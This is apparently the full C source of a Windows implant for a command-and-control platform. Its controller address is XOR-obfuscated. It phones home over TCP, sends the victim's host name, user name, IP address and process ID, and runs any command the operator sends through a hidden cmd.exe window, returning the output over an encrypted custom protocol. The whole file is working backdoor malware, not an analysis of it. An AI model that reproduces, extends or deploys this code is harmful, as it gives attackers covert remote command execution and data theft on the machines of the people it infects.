/* Windows xor-tcp implant (c2-platform v1)
 * Protocol: MAGIC A1B7, XOR payload, REGISTER / HEARTBEAT / EXEC / QUIT
 * Build: make -C implant
 */
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

static const unsigned char enc_host[] = {0x6b, 0x6a, 0x74, 0x68, 0x6b, 0x6b, 0x74, 0x6f, 0x6f, 0x74, 0x68, 0x00};
static const unsigned char enc_port[] = {0x69, 0x6e, 0x6f, 0x6c, 0x6d, 0x00};
static void xdec(char* dst, const unsigned char* enc) {
    int i = 0;
    while (enc[i]) { dst[i] = (char)(enc[i] ^ 0x5A); i++; }
    dst[i] = 0;
}

#define MAGIC0 0xA1
#define MAGIC1 0xB7
#define CMD_PING 0x01
#define CMD_EXEC 0x02
#define CMD_QUIT 0x03
#define CMD_REGISTER 0x10
#define CMD_HEARTBEAT 0x11
#define RSP_DATA 0x81
#define RSP_ERR 0x82
#define RSP_END 0x83
#define RSP_OK 0x90
#define BUF_SZ 8192

static const unsigned char xkey[32] = {
    0x2C,0x91,0x4F,0xE6,0x03,0xAA,0x7D,0x18,
    0xB5,0x62,0xCF,0x34,0xE9,0x8A,0x51,0x0D,
    0xF6,0x23,0x78,0xAC,0x41,0x9E,0x07,0xDC,
    0x65,0x38,0x90,0x4B,0x12,0xF9,0x06,0xB3
};

static void crypt_buf(unsigned char* d, int n, int seed) {
    for (int i = 0; i < n; i++)
        d[i] ^= xkey[(i + seed) & 31];
}

static int send_frame(SOCKET s, unsigned short type,
                      const unsigned char* payload, int plen) {
    unsigned char hdr[8];
    hdr[0] = MAGIC0; hdr[1] = MAGIC1;
    hdr[2] = type & 0xFF; hdr[3] = (type >> 8) & 0xFF;
    hdr[4] = plen & 0xFF; hdr[5] = (plen >> 8) & 0xFF;
    hdr[6] = (plen >> 16) & 0xFF; hdr[7] = (plen >> 24) & 0xFF;
    if (send(s, (char*)hdr, 8, 0) != 8) return -1;
    if (plen > 0) {
        unsigned char tmp[BUF_SZ];
        if (plen > BUF_SZ) return -1;
        memcpy(tmp, payload, plen);
        crypt_buf(tmp, plen, type);
        if (send(s, (char*)tmp, plen, 0) != plen) return -1;
    }
    return 0;
}

static int recv_frame(SOCKET s, unsigned short* type,
                      unsigned char* out, int* outlen) {
    unsigned char hdr[8];
    int got = 0;
    while (got < 8) {
        int r = recv(s, (char*)hdr + got, 8 - got, 0);
        if (r <= 0) return -1;
        got += r;
    }
    if (hdr[0] != MAGIC0 || hdr[1] != MAGIC1) return -1;
    *type = hdr[2] | (hdr[3] << 8);
    int plen = hdr[4] | (hdr[5] << 8) | (hdr[6] << 16) | (hdr[7] << 24);
    if (plen < 0 || plen > BUF_SZ) return -1;
    got = 0;
    while (got < plen) {
        int r = recv(s, (char*)out + got, plen - got, 0);
        if (r <= 0) return -1;
        got += r;
    }
    crypt_buf(out, plen, *type);
    *outlen = plen;
    return 0;
}

static void put_u16(unsigned char* p, unsigned short v) {
    p[0] = (unsigned char)(v & 0xFF);
    p[1] = (unsigned char)((v >> 8) & 0xFF);
}

static int append_str(unsigned char* buf, int cap, int off, const char* s) {
    int n = (int)strlen(s);
    if (n > 0xffff) n = 0xffff;
    if (off + 2 + n > cap) return -1;
    put_u16(buf + off, (unsigned short)n);
    memcpy(buf + off + 2, s, n);
    return off + 2 + n;
}

static int build_register(unsigned char* buf, int cap) {
    char host[256], user[256], ip[64];
    DWORD n;
    host[0] = user[0] = ip[0] = 0;
    n = sizeof(host);
    GetComputerNameA(host, &n);
    n = sizeof(user);
    GetUserNameA(user, &n);
    {
        char tmp[256];
        DWORD tlen = sizeof(tmp);
        if (GetComputerNameExA(ComputerNameDnsHostname, tmp, &tlen)) {
            /* keep GetComputerNameA result */
        }
    }
    {
        char hostname[256];
        struct hostent* he;
        gethostname(hostname, sizeof(hostname));
        he = gethostbyname(hostname);
        if (he && he->h_addr_list && he->h_addr_list[0]) {
            struct in_addr a;
            memcpy(&a, he->h_addr_list[0], 4);
            strncpy(ip, inet_ntoa(a), sizeof(ip) - 1);
        }
    }
    if (ip[0] == 0) strncpy(ip, "0.0.0.0", sizeof(ip) - 1);

    int off = 0;
    if (cap < 5) return -1;
    buf[0] = 1;
    {
        DWORD pid = GetCurrentProcessId();
        buf[1] = (unsigned char)(pid & 0xFF);
        buf[2] = (unsigned char)((pid >> 8) & 0xFF);
        buf[3] = (unsigned char)((pid >> 16) & 0xFF);
        buf[4] = (unsigned char)((pid >> 24) & 0xFF);
    }
    off = 5;
    off = append_str(buf, cap, off, host); if (off < 0) return -1;
    off = append_str(buf, cap, off, user); if (off < 0) return -1;
    off = append_str(buf, cap, off, "windows"); if (off < 0) return -1;
    off = append_str(buf, cap, off, "x64"); if (off < 0) return -1;
    off = append_str(buf, cap, off, ip); if (off < 0) return -1;
    return off;
}

static void run_cmd(SOCKET s, const char* cmdline) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hOutR = NULL, hOutW = NULL;
    char buf[BUF_SZ];
    DWORD rd = 0;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    if (!CreatePipe(&hOutR, &hOutW, &sa, 0)) {
        send_frame(s, RSP_ERR, (unsigned char*)"pipe fail", 9);
        return;
    }
    SetHandleInformation(hOutW, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hOutW;
    si.hStdError = hOutW;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c %s", cmdline);
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hOutR); CloseHandle(hOutW);
        send_frame(s, RSP_ERR, (unsigned char*)"spawn fail", 10);
        return;
    }
    CloseHandle(hOutW);
    unsigned int total = 0;
    for (;;) {
        BOOL ok = ReadFile(hOutR, buf, sizeof(buf) - 1, &rd, NULL);
        if (!ok || rd == 0) break;
        buf[rd] = 0;
        if (send_frame(s, RSP_DATA, (unsigned char*)buf, (int)rd) != 0) break;
        total += rd;
    }
    WaitForSingleObject(pi.hProcess, 20000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hOutR);
    if (total == 0) send_frame(s, RSP_DATA, (unsigned char*)"(no output)", 11);
    send_frame(s, RSP_END, NULL, 0);
}

static int session_loop(SOCKET s) {
    unsigned char inbuf[BUF_SZ];
    unsigned char regbuf[1024];
    unsigned short type;
    int inlen;
    int rlen = build_register(regbuf, sizeof(regbuf));
    if (rlen < 0) return -1;
    if (send_frame(s, CMD_REGISTER, regbuf, rlen) != 0) return -1;
    if (recv_frame(s, &type, inbuf, &inlen) != 0) return -1;
    if (type != RSP_OK) return -1;

    DWORD last_hb = GetTickCount();
    for (;;) {
        fd_set rfds;
        struct timeval tv;
        FD_ZERO(&rfds);
        FD_SET(s, &rfds);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        int sel = select(0, &rfds, NULL, NULL, &tv);
        if (sel < 0) return -1;
        if (sel > 0 && FD_ISSET(s, &rfds)) {
            if (recv_frame(s, &type, inbuf, &inlen) != 0) return -1;
            if (type == CMD_PING) {
                send_frame(s, RSP_DATA, (unsigned char*)"pong", 4);
            } else if (type == CMD_EXEC) {
                if (inlen >= (int)sizeof(inbuf)) inlen = (int)sizeof(inbuf) - 1;
                inbuf[inlen] = 0;
                run_cmd(s, (char*)inbuf);
                last_hb = GetTickCount();
            } else if (type == CMD_QUIT) {
                return 1;
            }
        }
        if (GetTickCount() - last_hb >= 10000) {
            if (send_frame(s, CMD_HEARTBEAT, NULL, 0) != 0) return -1;
            last_hb = GetTickCount();
        }
    }
}

int main(void) {
    WSADATA wsa;
    char host[64], port[16];
    int backoff = 5;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    xdec(host, enc_host);
    xdec(port, enc_port);

    for (;;) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        if (s == INVALID_SOCKET) {
            Sleep(backoff * 1000);
            continue;
        }
        struct sockaddr_in a;
        a.sin_family = AF_INET;
        a.sin_port = htons((unsigned short)atoi(port));
        a.sin_addr.s_addr = inet_addr(host);
        if (connect(s, (struct sockaddr*)&a, sizeof(a)) != 0) {
            closesocket(s);
            Sleep(backoff * 1000);
            if (backoff < 30) backoff *= 2;
            if (backoff > 30) backoff = 30;
            continue;
        }
        backoff = 5;
        session_loop(s);
        closesocket(s);
        Sleep(2000);
    }
}
